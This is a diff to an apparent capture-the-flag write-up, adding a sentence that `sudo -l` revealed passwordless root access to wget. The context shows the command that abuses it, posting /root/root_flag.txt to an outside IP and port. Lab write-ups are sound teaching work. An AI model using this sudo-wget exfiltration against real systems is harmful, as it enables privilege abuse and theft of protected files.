@@ -79,6 +79,10 @@ User flag:
         (ALL : ALL) ALL
         (root) NOPASSWD: /usr/bin/wget
 
+To identify privilege escalation vectors, the `sudo -l` command was executed. 
+
+The output showed that the user could run `/usr/bin/wget` as root without a password
+
 `sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.114.160.103:123`
 
 <img width="873" height="76" alt="image" src="https://github.com/user-attachments/assets/6df59131-f180-417d-8327-438a5d9c20e3" />
